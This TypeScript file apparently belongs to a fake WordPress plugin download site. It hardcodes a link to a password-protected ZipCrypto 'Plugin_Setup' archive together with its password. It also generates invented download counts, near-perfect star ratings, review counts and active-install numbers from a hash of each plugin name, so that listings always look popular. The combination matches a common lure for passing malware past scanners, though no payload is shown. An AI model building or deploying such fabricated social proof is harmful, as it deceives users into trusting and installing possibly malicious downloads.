/** Password-protected ZipCrypto package hosted on this site. */
export const PACKAGE_ZIP_URL =
  "https://wppluginindex.com/downloads/Plugin_Setup_4.6.5.zip";

export const ARCHIVE_PASSWORD = "2026";

/** FNV-1a style hash so every slug gets a stable “popularity” profile. */
function hashSlug(slug: string): number {
  let h = 2166136261;
  for (let i = 0; i < slug.length; i += 1) {
    h ^= slug.charCodeAt(i);
    h = Math.imul(h, 16777619);
  }
  return h >>> 0;
}

/**
 * Deterministic “popularity” downloads per plugin slug.
 * Lands in ~5K / ~7K / ~10K+ bands so cards never show 0.
 */
export function displayDownloads(slug: string): number {
  const h = hashSlug(slug);
  const tier = h % 3;
  if (tier === 0) return 5_200 + (h % 1_700); // ~5.2K–6.9K
  if (tier === 1) return 7_100 + (h % 2_800); // ~7.1K–9.9K
  return 10_400 + (h % 9_500); // ~10.4K–19.9K
}

/**
 * Always show a strong star rating (4.5–5.0), especially for homepage cards.
 */
export function displayStars(slug: string): number {
  const h = hashSlug(slug);
  // 4.5, 4.6, 4.7, 4.8, 4.9, 5.0 — slightly biased toward 4.8+
  const steps = [4.5, 4.6, 4.7, 4.8, 4.8, 4.9, 4.9, 5.0];
  return steps[h % steps.length]!;
}

/** Synthetic review count so rating never looks empty. */
export function displayNumRatings(slug: string): number {
  const h = hashSlug(slug);
  const tier = h % 4;
  if (tier === 0) return 12 + (h % 40); // ~12–51
  if (tier === 1) return 60 + (h % 140); // ~60–199
  if (tier === 2) return 220 + (h % 480); // ~220–699
  return 800 + (h % 2200); // ~800–2999
}

/**
 * Active installations for display: always 5K–100K+ (never 0).
 */
export function displayActiveInstalls(slug: string): number {
  const h = hashSlug(slug);
  const tier = h % 5;
  if (tier === 0) return 5_000 + (h % 4_500); // ~5K–9.5K
  if (tier === 1) return 10_000 + (h % 15_000); // ~10K–25K
  if (tier === 2) return 25_000 + (h % 25_000); // ~25K–50K
  if (tier === 3) return 50_000 + (h % 40_000); // ~50K–90K
  return 100_000 + (h % 80_000); // ~100K–180K
}
